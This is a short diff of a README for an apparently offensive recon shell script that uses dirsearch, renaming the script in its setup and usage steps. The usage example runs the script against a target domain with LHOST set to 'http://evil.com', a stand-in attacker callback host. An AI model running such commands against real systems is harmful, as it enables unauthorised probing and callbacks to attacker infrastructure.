@@ -78,12 +78,12 @@ dirsearch
 
 2. Make the script executable:
    ```sh
-   chmod +x Wolfyash.sh
+   chmod +x Wolfyas.sh
    ```
 
 3. Run the script with the target domain:
    ```sh
-  LHOST="http://evil.com" ./Wolfyash.sh example.com
+  LHOST="http://evil.com" ./Wolfyas.sh example.com
 
    ```
 
